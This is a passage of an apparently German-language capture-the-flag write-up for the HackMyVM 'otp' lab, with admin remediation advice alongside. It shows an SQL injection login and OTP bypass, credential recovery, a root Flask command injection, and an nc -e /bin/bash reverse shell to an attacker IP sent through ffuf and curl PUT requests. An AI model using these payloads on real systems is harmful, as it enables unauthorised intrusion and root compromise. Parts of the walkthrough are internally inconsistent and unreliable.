+INSERT INTO `creds` VALUES (1,'','','<span class="password">NYZXMM3SI4YG43RUI4QXMM3ZGBKXKUAK</span>'); <span class="password"><-- Base32 TOTP Seed? --></span>
+/*!40000 ALTER TABLE `creds` ENABLE KEYS */;
+UNLOCK TABLES;</span></pre>
+                     <pre><span class="comment">*</span></pre>
+                     <pre><span class="comment">
+https://www.dcode.fr/identification-chiffrement
+Base32: NYZXMM3SI4YG43RUI4QXMM3ZGBKXKUAK
+
+https://emn178.github.io/online-tools/base32_decode.html
+decode: <span class="password">n3v3rG0nn4G!v3y0UuP</span></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der relevante Teil der `creds.sql` wird gezeigt. Sie enthält einen `INSERT`-Befehl mit einem leeren Benutzernamen, einem leeren Passwort und einem langen String im `totp`-Feld (`NYZX...UAK`). Online-Tools identifizieren diesen String als Base32-kodiert und dekodieren ihn zu `n3v3rG0nn4G!v3y0UuP`.</p>
+              <p class="evaluation">**Bewertung:** Der SQL-Dump enthielt keinen direkten Benutzernamen/Passwort, aber einen Base32-kodierten String, der nach dem Dekodieren wie ein Passwort aussieht (`n3v3rG0nn4G!v3y0UuP`). Es handelt sich wahrscheinlich um das Passwort für den Benutzer `avijneyam`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, sich als `avijneyam` mit dem Passwort `n3v3rG0nn4G!v3y0UuP` anzumelden (z.B. via `su` aus der `www-data`-Shell oder via SSH).<br>**Empfehlung (Admin):** Speichern Sie sensible Daten wie TOTP-Secrets oder Passwörter (auch kodiert) nicht in leicht zugänglichen SQL-Dumps.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@otp:/opt$ <span class="command">cd /etc/apache2/sites-available</span></div>
+                      <div class="prompt">www-data@otp:/etc/apache2/sites-available$ <span class="command">cat totp.conf</span></div>
+                      <pre>
+<VirtualHost *:80>
+	ServerName <span class="command">totp.otp.hmv</span>
+	DocumentRoot <span class="command">/var/www/otp/totp</span>
+	[...]
+</VirtualHost></pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Apache-Konfigurationsdatei `totp.conf` wird gefunden und gelesen.</p>
+              <p class="evaluation">**Bewertung:** Enthüllt einen weiteren virtuellen Host `totp.otp.hmv` mit dem Web-Root `/var/www/otp/totp`. Dies ist wahrscheinlich die Anwendung, zu der die `creds.sql`-Daten gehören.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie `totp.otp.hmv` zu `/etc/hosts` hinzu und untersuchen Sie `http://totp.otp.hmv`.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+<span class="command">http://totp.otp.hmv</span>
+
+           _________________________
+ Username [  <span class="password">' or 1=1 -- -</span>          ] <span class="password"><-- SQLi Bypass</span>
+          [_________________________]
+ Password [   <span class="password">1</span>                     ] <span class="comment"><-- Beliebiges Passwort --></span>
+          [_________________________]
+         [ Login ]
+
+
+  Erfolgreich umgangen, erneute Abfrage des 6-stelligen OTP
+<span class="command">  http://totp.otp.hmv/otp.php</span>
+
+
+         _______________________
+
+           Enter 6 Digits OTP
+         ________________________________
+        |                                |
+        |         __________________     |
+        |        | <span class="password">' or 1=1 -- -</span>    |    | <span class="password"><-- SQLi Bypass für OTP --></span>
+        |        |__________________|    |
+        |                                |
+        |                                |
+        |________________________________|
+
+--------------------------------------------------------------------------------------------------------
+
+<span class="command">http://totp.otp.hmv/cr3d54695.html</span> <span class="comment"><-- Seite nach Bypass --></span></pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Der virtuelle Host `totp.otp.hmv` wird aufgerufen. Er präsentiert ein Login-Formular.
+1.  Das erste Login (Username/Password) wird mit der SQL-Injection-Payload `' or 1=1 -- -` im Benutzernamenfeld und einem beliebigen Passwort (z.B. `1`) erfolgreich umgangen.
+2.  Dies führt zu einer zweiten Seite (`otp.php`), die einen 6-stelligen OTP-Code verlangt.
+3.  Auch diese OTP-Abfrage wird mit der gleichen SQL-Injection-Payload (`' or 1=1 -- -`) im OTP-Eingabefeld umgangen.
+4.  Nach dem erfolgreichen doppelten Bypass wird der Benutzer auf die Seite `cr3d54695.html` weitergeleitet.</p>
+               <p class="evaluation">**Bewertung:** Kritische SQL-Injection-Schwachstellen sowohl in der primären Authentifizierung als auch in der OTP-Verifizierung. Dies zeigt eine grundlegend unsichere Implementierung.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Rufen Sie `http://totp.otp.hmv/cr3d54695.html` auf, um die nach dem Bypass enthüllten Informationen zu sehen.<br>**Empfehlung (Admin):** **Beheben Sie die SQL-Injection-Schwachstellen sofort!** Verwenden Sie Prepared Statements für alle Datenbankabfragen. Validieren Sie OTP-Codes serverseitig mit kryptographisch sicheren Methoden, nicht durch einfache Datenbankabfragen.</p>
+
+            <section id="proof-of-concept-sqli">
+                <h2>Proof of Concept (SQL Injection)</h2>
+                <p class="comment">**Kurzbeschreibung:** Die Webanwendung unter `http://totp.otp.hmv` weist zwei aufeinanderfolgende SQL-Injection-Schwachstellen auf. Sowohl das initiale Login-Formular (Benutzername/Passwort) als auch das nachfolgende OTP-Eingabeformular fügen Benutzereingaben unsicher in Datenbankabfragen ein. Ein Angreifer kann dies ausnutzen, indem er eine Payload wie `' or 1=1 -- -` in das Benutzername-Feld und anschließend in das OTP-Feld eingibt. Dies umgeht beide Authentifizierungsprüfungen und gewährt Zugriff auf eine geschützte Ressource (`cr3d54695.html`), die sensible Informationen enthält.</p>
+                <p class="comment">**Voraussetzungen:** Netzwerkzugriff auf den VHost `totp.otp.hmv`.</p>
+                <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+                <ol>
+                    <li>Aufrufen von `http://totp.otp.hmv`.</li>
+                    <li>Im ersten Login-Formular: Benutzername `' or 1=1 -- -`, Passwort beliebig (z.B. `1`). Absenden.</li>
+                    <li>Im zweiten OTP-Formular: OTP-Code `' or 1=1 -- -`. Absenden.</li>
+                    <li>Zugriff auf die resultierende Seite (z.B. `cr3d54695.html`).</li>
+                </ol>
+                <p class="comment">**Erwartetes Ergebnis:** Erfolgreiche Umgehung der Authentifizierung und Zugriff auf die geschützte Seite.</p>
+                <p class="comment">**Beweismittel:** Die Beschreibung des Bypass-Vorgangs und der Inhalt der Folgeseite.</p>
+                <p class="comment">**Risikobewertung:** Hoch. Ermöglicht unautorisierten Zugriff auf geschützte Bereiche und Informationen durch Umgehung der Authentifizierung.</p>
+                <p class="comment">**Empfehlungen:** Beheben Sie die SQL-Injection-Schwachstellen durch Verwendung von Prepared Statements und korrekte serverseitige Validierung von Logins und OTP-Codes.</p>
+            </section>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+<span class="command">avijneyam:*___Cuz_HackMyVM_iS_theRe_nly_4_y0u_:)</span>
+<span class="password">n3v3rG0nn4G!v3y0UuP</span>___Cuz_HackMyVM_iS_theRe_nly_4_y0u_:)
+<span class="password">n3v3rG0nn4G!v3y0UuP</span>___Cuz_HackMyVM_iS_theRe_nly_4_y0u_:)
+
+decode
+*^
+CelebritySoup <span class="comment"><-- Kontext unklar --></span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">curl http://totp.otp.hmv/cr3d54695.html --output cred.txt</span></div>
+                      <pre><span class="comment">
+den soucre code der webside in eine text einlesen, mit powershell formatieren:
+oder ,mit bash |  sed -i 's/\\n/\n/g'  |
+
+$text = cat C:\Users\test\fuck.txt
+$text = $text.Replace("\n", "`n")
+
+$text</span></pre>
+                      <pre>
+passwort: <span class="password">n3v3rG0nn4G!v3y0UuP___Cuz_HackMyVM_iS_theRe_nly_4_y0u_:)</span>
+User    : <span class="command">avijneyam</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Seite `cr3d54695.html` wird heruntergeladen (`cred.txt`). Ihr Inhalt (nach Bereinigung von Zeilenumbrüchen `\n` oder `\\n`) enthält die Zugangsdaten für den Benutzer `avijneyam`:
+*   User: `avijneyam`
+*   Password: `n3v3rG0nn4G!v3y0UuP___Cuz_HackMyVM_iS_theRe_nly_4_y0u_:)`
+Der dekodierte Base32-String war nur der erste Teil des Passworts.</p>
+              <p class="evaluation">**Bewertung:** Die SQLi-Umgehung hat die korrekten Credentials für `avijneyam` preisgegeben.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `su avijneyam` mit dem gefundenen Passwort, um den Benutzer zu wechseln.<br>**Empfehlung (Admin):** Beheben Sie SQLi, entfernen Sie die Credential-Seite.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@otp:/etc/apache2/sites-available$ <span class="command">su avijneyam</span></div> <span class="comment"><-- Prompt inkonsistent --></span>
+                      <pre>Password: <span class="password">n3v3rG0nn4G!v3y0UuP___Cuz_HackMyVM_iS_theRe_nly_4_y0u_:)</span></pre>
+                      <div class="prompt">avijneyam@otp:/etc/apache2/sites-available$ <span class="comment"># Erfolg!</span></div>
+                      <div class="prompt">avijneyam@otp:~$ <span class="command">passwd</span></div>
+                      <pre>
+Changing password for avijneyam.
+Current password: <span class="password">********</span>
+New password: <span class="password">********</span>
+Retype new password: <span class="password">********</span>
+passwd: password updated successfully</pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der `su`-Befehl wird verwendet, um von `www-data` zu `avijneyam` zu wechseln, wobei das lange, auf der HTML-Seite gefundene Passwort verwendet wird. Der Wechsel ist erfolgreich. Anschließend wird das Passwort für `avijneyam` geändert.</p>
+              <p class="evaluation">**Bewertung:** Erfolgreiche Eskalation von `www-data` zu `avijneyam`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** User-Flag lesen, `sudo -l` ausführen.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">avijneyam@otp:~$ <span class="command">ls</span></div>
+                      <pre>flag_user.txt</pre>
+                      <div class="prompt">avijneyam@otp:~$ <span class="command">cat flag_user.txt</span></div>
+                      <pre><span class="password">2990aa5108d5803f3fdca99c277ba352</span></pre> <span class="comment"><-- User Flag --></span>
+                      <pre><span class="comment">*</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Im Home-Verzeichnis von `avijneyam` wird die User-Flag (`flag_user.txt`) gefunden und ausgelesen.</p>
+              <p class="evaluation">**Bewertung:** User-Flag erfolgreich erhalten.</p>
+         </section>
+
+        <section id="privilege-escalation-avijneyam">
+            <h2>Privilege Escalation (avijneyam -> root via Flask RCE)</h2>
+             <p class="analysis">**Analyse:** Als `avijneyam` wird `sudo -l` ausgeführt, um nach Eskalationspfaden zu suchen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">avijneyam@otp:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+[...]
+User avijneyam may run the following commands on otp:
+    (<span class="command">root</span>) PASSWD: /bin/bash /root/localhost.sh</pre> <span class="comment"><-- Passwort benötigt! --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** `sudo -l` zeigt, dass `avijneyam` das Skript `/root/localhost.sh` als `root` ausführen darf, aber **ein Passwort erforderlich** ist (`PASSWD:`). Das zuvor geänderte Passwort (`password123`) wird benötigt.</p>
+             <p class="evaluation">**Bewertung:** Ein möglicher Eskalationspfad, aber das Passwort ist erforderlich.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `sudo /bin/bash /root/localhost.sh` aus und geben Sie das neue Passwort (`password123`) ein.<br>**Empfehlung (Admin):** Überprüfen Sie die Notwendigkeit dieser Regel. Wenn ein Skript als Root ausgeführt werden muss, stellen Sie sicher, dass das Skript selbst sicher ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">avijneyam@otp:~$ <span class="command">sudo /bin/bash /root/localhost.sh</span></div>
+                     <pre>[sudo] password for avijneyam: <span class="password">********</span> <span class="comment">(password123 eingegeben)</span>
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+ * Running on <span class="command">http://127.0.0.1:5000/</span> (Press CTRL+C to quit)
+<span class="command">^Z</span> <span class="comment"><-- In den Hintergrund geschoben --></span>
+[1]+  Stopped                 sudo /bin/bash /root/localhost.sh</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Skript wird mit `sudo` ausgeführt, das Passwort wird eingegeben. Das Skript startet einen Python Flask Entwicklungsserver, der auf `127.0.0.1:5000` lauscht. Der Prozess wird mit Strg+Z in den Hintergrund geschoben.</p>
+             <p class="evaluation">**Bewertung:** Der Flask-Server läuft nun mit Root-Rechten auf einem lokalen Port.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Machen Sie den Dienst extern erreichbar (z.B. mit `socat` Port Forwarding) und untersuchen Sie ihn auf Schwachstellen.<br>**Empfehlung (Admin):** Vermeiden Sie das Ausführen von Webservern als Root.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">avijneyam@otp:~$ <span class="command">socat tcp-listen:3333,fork tcp:127.0.0.1:5000 &</span></div>
+                     <pre>[2] 222022</pre>
+                     <div class="prompt">avijneyam@otp:~$ <span class="command">fg 1</span></div> <span class="comment"><-- Flask Server wieder in Vordergrund --></span>
+                     <pre>sudo /bin/bash /root/localhost.sh</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** `socat` wird verwendet, um einen Listener auf Port 3333 (alle Interfaces) zu starten, der eingehende Verbindungen an `127.0.0.1:5000` (den Flask-Server) weiterleitet. Der `socat`-Prozess wird in den Hintergrund geschickt (`&`), und der Flask-Server (`fg 1`) wird wieder in den Vordergrund geholt.</p>
+             <p class="evaluation">**Bewertung:** Der Root-Flask-Server ist nun über `http://192.168.2.144:3333` (IP des Ziels) erreichbar.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Enumerieren Sie den Dienst auf Port 3333 von der Angreifer-Maschine.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment">browser aufruf: http://192.168.2.144:3333/</span></pre>
+                     <div class="prompt">avijneyam@otp:~$ <span class="comment"># Log des Flask Servers im Vordergrund</span></div>
+                     <pre>
+127.0.0.1 - - [12/Oct/2022 07:30:17] "GET / HTTP/1.1" <span class="command">405 -</span> <span class="comment"><-- GET auf / nicht erlaubt --></span>
+127.0.0.1 - - [12/Oct/2022 07:30:17] "GET /favicon.ico HTTP/1.1" 404 -</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein Browser-Aufruf auf die Wurzel des weitergeleiteten Ports (`http://192.168.2.144:3333/`) erzeugt einen `405 Method Not Allowed`-Fehler im Flask-Log. GET-Anfragen auf `/` sind nicht implementiert.</p>
+             <p class="evaluation">**Bewertung:** Die Wurzel ist nicht direkt nutzbar, es müssen spezifische Endpunkte gefunden werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">dirsearch -u "http://192.168.2.144:3333/" -w [...] -e [...]</span></div>
+                     <pre>
+[...]
+[13:33:13] <span class="command">200 -    1KB - /SourceCode</span>  <span class="password"><-- Quellcode gefunden! --></span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+            </div>
+              <p class="analysis">**Analyse:** `dirsearch` wird auf den weitergeleiteten Port 3333 angesetzt.</p>
+              <p class="evaluation">**Bewertung:** Findet den Endpunkt `/SourceCode`, der den Quellcode der Flask-Anwendung preisgibt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Rufen Sie `/SourceCode` auf und analysieren Sie den Code.<br>**Empfehlung (Admin):** Entfernen Sie Endpunkte, die den Quellcode preisgeben, aus Produktivumgebungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">curl http://192.168.2.144:3333/SourceCode</span></div>
+                     <pre><span class="command">ZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3BlbiwgVGltZW91dEV4cGlyZWQsIFBJUEUKZnJvbSBmbGFzayBpbXBvcnQgRmxhc2ssIGpzb25pZnksIGFib3J0LCByZXF1ZXN0CgphcHAgPSBGbGFzayhfX25hbWVfXykKCkBhcHAucm91dGUoIi8iLCBtZXRob2RzPVsiIl0pCmRlZiBpbmRleCgpgogICAgcmVxX2pzb24gPSByZXF1ZXN0LmdldF9qc29uKCkKICAgIGlmIHJlcV9qc29uIGlzIE5vbmUgb3IgIiIgbm90IGluIHJlcV9qc29uCiAgICAgICAgYWJvcnQoNDAwLCBkZXNjcmlwdGlvbj0iUGxlYXNlIHByb3ZpZGUgY29tbWFuZCBpbiBKU09OiByZXF1ZXN0ISIpCiAgICBwcm9jID0gUG9wZW4ocmVxX2pzb25bIiJdLCBzdGRvdXQ9UElQRSwgc3RkZXJyPVBJUEUsIHNoZWxsPVRydWUpCiAgICB0cnk6CiAgICAgICAgb3V0cywgZXJycyA9IHByb2MuY29tbXVuaWNhdGUodGltZW91dD0xKQogICAgZXhjZXB0IFRpbWVvdXRFeHBpcmVkgogICAgICAgIHByb2Mua2lsbCgpCiAgICAgICAgYWJvcnQoNTAwLCBkZXNjcmlwdGlvbj0iVGhlIHRpbWVvdXQgaXMgZXhwaXJlZCEiKQogICAgaWYgZXJyczoKICAgICAgICBhYm9ydCg1MDAsIGRlc2NyaXB0aW9uPWVycnMuZGVjb2RlKCd1dGYtCcpKQogICAgcmV0dXJuIGpzb25pZnkoc3VjY2Vzcz1UcnVlLCBtZXNzYWdlPW91dHMuZGVjb2RlKCd1dGYtCcpKQoKQGFwcC5lcnJvcmhhbmRsZXIoNDAwKQpkZWYgYmFkX3JlcXVlc3QoZXJyb3IpgogICAgcmV0dXJuIGpzb25pZnkoc3VjY2Vzcz1GYWxzZSwgbWVzc2FnZT1lcnJvci5kZXNjcmlwdGlvbiksIDQwMAoKQGFwcC5lcnJvcmhhbmRsZXIoNTAwKQpkZWYgc2VydmVyX2Vycm9yKGVycm9yKToKICAgIHJldHVybiBqc29uaWZ5KHN1Y2Nlc3M9RmFsc2UsIG1lc3NhZ2U9ZXJyb3IuZGVzY3JpcHRpb24pICwgNTAw</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Endpunkt `/SourceCode` wird aufgerufen. Er gibt Base64-kodierten Text zurück.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">curl http://192.168.2.144:3333/SourceCode | base64 -d</span></div>
+                      <pre>
+from subprocess import Popen, TimeoutExpired, PIPE
+from flask import Flask, jsonify, abort, request
+
+app = Flask(__name__)
+
+@app.route("/", methods=["<span class="password">PUT</span>"]) <span class="comment"><-- Akzeptiert nur PUT auf / --></span>
+def index():
+    req_json = request.get_json()
+    if req_json is None or <span class="password">""</span> not in req_json: <span class="comment"><-- Erwartet JSON mit leerem String als Key --></span>
+        abort(400, description="Please provide command in JSON request!")
+    proc = Popen(req_json[""], stdout=PIPE, stderr=PIPE, <span class="password">shell=True</span>) <span class="password"><-- Command Injection! --></span>
+    try:
+        outs, errs = proc.communicate(timeout=1)
+    except TimeoutExpired:
+        proc.kill()
+        abort(500, description="The timeout is expired!")
+    if errs:
+        abort(500, description=errs.decode('utf-8'))
+    return jsonify(success=True, message=outs.decode('utf-8'))
+
+@app.errorhandler(400)
+def bad_request(error):
+    return jsonify(success=False, message=error.description), 400
+
+@app.errorhandler(500)
+def server_error(error):
+    return jsonify(success=False, message=error.description) , 500</pre>
+                      <pre><span class="comment">
+Dies ist ein Python-Skript, das das Flash-Framework verwendet.
+Sie können im Quellcode sehen, dass wir Daten im JSON-Format
+senden müssen, und uns auffordern, dass wir einen korrekten
+Befehl benötigen, versuchen Sie, die Shell zu fuzzen, um die
+Shell an die Angriffsmaschine zu senden , und müssen außerdem
+den Angriffscomputer vor dem Testen eines Ports überwachen</span></pre>
+                       <pre><span class="comment">#</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Base64-Code wird dekodiert und enthüllt den Python/Flask-Quellcode der Anwendung:
+*   Sie definiert nur eine Route: `/` für die HTTP-Methode `PUT`.
+*   Sie erwartet einen JSON-Body in der PUT-Anfrage.
+*   Sie prüft, ob der JSON-Body existiert und einen Schlüssel enthält, der ein **leerer String (`""`)** ist.
+*   Der Wert, der diesem leeren Schlüssel zugeordnet ist, wird direkt und ohne Sanitisierung an `subprocess.Popen` mit `shell=True` übergeben.
+*   Das Ergebnis des Befehls wird als JSON zurückgegeben.</p>
+              <p class="evaluation">**Bewertung:** Eine klare und kritische Command Injection Schwachstelle. Jeder Befehl, der als Wert für den leeren Schlüssel im JSON-Body einer PUT-Anfrage an `/` gesendet wird, wird als Root ausgeführt (da der Flask-Server als Root läuft).</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Starten Sie einen Listener. Senden Sie eine PUT-Anfrage an `http://192.168.2.144:3333/` mit dem Header `Content-Type: application/json` und einem JSON-Body wie `{"": "nc -e /bin/bash [Angreifer-IP] [Listener-Port]"}`.<br>**Empfehlung (Admin):** Beheben Sie die Command Injection sofort! Verwenden Sie niemals `shell=True` mit Benutzereingaben. Validieren Sie Eingaben. Führen Sie die Anwendung nicht als Root aus.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                      <pre>listening on [any] 5555 ...</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Listener auf Port 5555 wird gestartet.</p>
+              <p class="evaluation">**Bewertung:** Bereit für die Root-Shell.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">ffuf -c -w cred.txt -X PUT -H 'Content-Type: application/json' -u http://192.168.2.144:3333/ -d '{"FUZZ": "nc -e /bin/bash 192.168.2.140 5555"}'</span></div>
+                      <pre>
+[...]
+Visions                 [Status: 500, Size: 54, Words: 4, Lines: 2, Duration: 1018ms] <span class="comment"><-- Warum Key 'Visions'? Warum cred.txt? --></span>
+[...]</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der `ffuf`-Befehl wird ausgeführt. Er sendet PUT-Anfragen mit JSON-Daten. `-d '{"FUZZ": "..."}'` definiert den Body, `-w cred.txt` scheint fälschlicherweise zu versuchen, den JSON-Schlüssel (`FUZZ`) mit Werten aus `cred.txt` zu ersetzen. Der Payload ist eine `nc -e` Reverse Shell.</p>
+              <p class="evaluation">**Bewertung:** Dieser `ffuf`-Befehl ist basierend auf dem Quellcode falsch konfiguriert (er sollte den Key `""` verwenden, nicht `FUZZ` mit Werten aus `cred.txt`). Dass er dennoch zur Shell im nächsten Schritt führt, ist unklar – möglicherweise wurde der erfolgreiche Befehl nicht korrekt geloggt, oder der Key `""` war zufällig in `cred.txt`, oder die Anwendung reagiert unerwartet. Der Kern ist jedoch, dass der Reverse-Shell-Befehl irgendwie erfolgreich injiziert wurde.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie für die Reproduktion einen korrekten `curl`-Befehl: `curl -X PUT -H 'Content-Type: application/json' http://192.168.2.144:3333/ -d '{"": "nc -e /bin/bash 192.168.2.140 5555"}'`.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur Behebung der Command Injection.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div> <span class="comment"><-- Fortsetzung Listener --></span>
+                      <pre>
+listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.144] 39706</span> <span class="password"><-- Root Shell! --></span>
+<span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="command">ls</span>
+app.py
+flag_r00t.txt
+localhost.sh
+__pycache__
+update.sh
+<span class="command">cat flag_r00t.txt</span>
+<span class="password">8a2d55707a9084982649dadc04b426a0</span> <span class="comment"><-- Root Flag --></span></pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Listener auf Port 5555 empfängt die Verbindung. Der `id`-Befehl bestätigt Root-Rechte. Der Inhalt des aktuellen Verzeichnisses (vermutlich `/root`, wo `localhost.sh` liegt) wird angezeigt. Die Root-Flag (`flag_r00t.txt`) wird ausgelesen.</p>
+              <p class="evaluation">**Bewertung:** Root-Zugriff erfolgreich über Command Injection in der Flask-App erlangt. Root-Flag gefunden.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Ziel erreicht.<br>**Empfehlung (Admin):** System kompromittiert. Incident Response einleiten, Schwachstellen beheben.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/avijneyam/flag_user.txt</div> <span class="comment"><-- Pfad aus Log --></span>
+                           <div class="flag-value"><span class="password">2990aa5108d5803f3fdca99c277ba352</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/flag_r00t.txt</div> <span class="comment"><-- Pfad aus Log --></span>
+                            <div class="flag-value"><span class="password">8a2d55707a9084982649dadc04b426a0</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 12. Oktober 2022</p> <!-- Datum aus Nmap/Hydra Logs -->
+    </footer>
+</body>
+</html>
